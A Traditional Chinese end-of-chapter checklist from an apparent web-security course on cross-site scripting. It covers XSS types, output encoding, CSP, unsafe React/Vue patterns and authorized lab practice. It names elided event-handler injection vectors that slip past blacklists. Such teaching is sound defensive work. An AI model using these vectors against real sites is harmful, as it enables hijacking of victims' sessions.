### 進入下一章前的自我檢查清單

- [ ] 我能說出 XSS 的本質是「注入到瀏覽器」,並解釋為什麼「以受害者身分執行」這麼危險。
- [ ] 我能用「資料流」講清楚反射型、儲存型、DOM 型的差別,並說出為什麼儲存型最危險。
- [ ] 我知道 `<img src=x onerror=...>`、`<svg onload=...>` 為什麼不用 `<script>` 也能執行,以及黑名單為什麼防不住。
- [ ] 我理解「context-aware 輸出編碼」是根治核心,而且不同上下文要用不同編碼。
- [ ] 我能解釋 CSP 為什麼是「縱深防禦而非萬靈丹」,以及 `'unsafe-inline'` 為什麼是敗筆。
- [ ] (前端工程師)我知道 React/Vue 為什麼預設安全,也知道 `dangerouslySetInnerHTML` / `v-html` / 把資料塞進 `href` 這三種破功寫法。
- [ ] 我知道去 DVWA / Juice Shop 的哪些模組練三型 XSS,而且清楚只能在授權環境練。

七題都能答,我們就往「請求偽造」的世界前進。
